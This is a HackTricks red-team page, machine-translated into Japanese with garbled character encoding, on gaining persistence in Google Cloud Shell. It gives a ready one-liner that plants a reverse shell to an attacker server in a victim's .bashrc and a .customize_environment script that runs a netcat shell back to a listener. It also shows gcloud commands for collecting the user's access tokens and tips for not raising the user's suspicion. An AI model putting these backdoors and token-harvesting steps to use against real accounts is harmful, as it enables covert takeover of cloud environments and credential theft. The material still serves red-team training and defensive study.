# GCP - Cloud Shell Persistence

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)ã«PRã‚’æå‡ºã—ã¦ã€**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã™ã‚‹
*
*
*
* &#x20;githubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>

## Cloud Shell

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### æ°¸ç¶šçš„ãªãƒãƒƒã‚¯ãƒ‰ã‚¢

[**Google Cloud Shell**](https://cloud.google.com/shell/)ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ç›´æ¥ã‚¯ãƒ©ã‚¦ãƒ‰ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã€é–¢é€£ã™ã‚‹ã‚³ã‚¹ãƒˆã¯ã‹ã‹ã‚Šã¾ã›ã‚“ã€‚

**Google Cloud Shell**ã«ã¯ã€**webã‚³ãƒ³ã‚½ãƒ¼ãƒ«**ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã€**`gcloud cloud-shell ssh`**ã‚’å®Ÿè¡Œã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ã“ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ã¯ã€æ”»æ’ƒè€…ã«ã¨ã£ã¦èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™ï¼š

1. **Google Cloudã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ä»»æ„ã®Googleãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ã€å®Œå…¨ã«èªè¨¼ã•ã‚ŒãŸCloud Shellã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯ã€çµ„ç¹”ã®æ‰€æœ‰è€…ã§ã‚ã£ã¦ã‚‚å¯èƒ½ã§ã™ï¼‰ã€‚
2. ãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ã€**æ´»å‹•ãŒãªã„å ´åˆã§ã‚‚å°‘ãªãã¨ã‚‚120æ—¥é–“ã¯ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ç¶­æŒ**ã—ã¾ã™ã€‚
3. ãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®æ´»å‹•ã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã®**çµ„ç¹”ã®æ©Ÿèƒ½ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚

åŸºæœ¬çš„ã«ã¯ã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’è¨­ç½®ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå°‘ãªãã¨ã‚‚120æ—¥ã”ã¨ã«GC Shellã«æ¥ç¶šã™ã‚‹é™ã‚Šã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¯ç”Ÿãæ®‹ã‚Šã€æ”»æ’ƒè€…ã¯æ¬¡å›å®Ÿè¡Œã•ã‚Œã‚‹ãŸã³ã«ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã¾ã™ã€‚ä»¥ä¸‹ã‚’å®Ÿè¡Œã™ã‚‹ã ã‘ã§ï¼š
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€ã«ã¯**`.customize_environment`**ã¨ã„ã†åˆ¥ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã³ã«**å®Ÿè¡Œ**ã•ã‚Œã¾ã™ï¼ˆå‰ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¨åŒæ§˜ï¼‰ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«ã‚’ã€Œé »ç¹ã«ã€ä½¿ç”¨ã™ã‚‹é™ã‚Šã€å‰ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¾ãŸã¯æ¬¡ã®ã‚ˆã†ãªãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’æŒ¿å…¥ã—ã¦æŒç¶šæ€§ã‚’ç¶­æŒã—ã¾ã™ã€‚
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**èªè¨¼ãŒå¿…è¦ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒåˆã‚ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã**ã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—èªè¨¼ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¯ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å‰ã«æ‰¿èªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚äºˆæœŸã—ãªã„ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆã€ç–‘å¿µã‚’æŠ±ã‹ã‚Œã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹æŒç¶šæ€§æ‰‹æ³•ãŒæãªã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

ã“ã‚Œã¯ã€ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«ï¼ˆæ”»æ’ƒè€…ã¨ã—ã¦ï¼‰ã‹ã‚‰`gcloud projects list`ã‚’å®Ÿè¡Œã—ãŸéš›ã®ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¦ãƒ¼ã‚¶ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§è¡¨ç¤ºã•ã‚Œã‚‹ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ãŸã ã—ã€ãƒ¦ãƒ¼ã‚¶ãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã«ã‚¯ãƒ©ã‚¦ãƒ‰ã‚·ã‚§ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã¯è¡¨ç¤ºã•ã‚Œãšã€ãƒ¦ãƒ¼ã‚¶ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**åé›†**ã§ãã¾ã™ã€‚
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSHæ¥ç¶šã®ç¢ºç«‹æ–¹æ³•

åŸºæœ¬çš„ã«ã€ä»¥ä¸‹ã®3ã¤ã®APIå‘¼ã³å‡ºã—ãŒä½¿ç”¨ã•ã‚Œã¾ã™:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (ãƒ­ãƒ¼ã‚«ãƒ«ã§ä½œæˆã—ãŸå…¬é–‹éµã‚’è¿½åŠ ã™ã‚‹)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èµ·å‹•ã™ã‚‹)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (Google Cloud Shellã®IPã‚’æ•™ãˆã¦ãã‚Œã‚‹)

ã—ã‹ã—ã€[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key) ã§ã•ã‚‰ã«æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
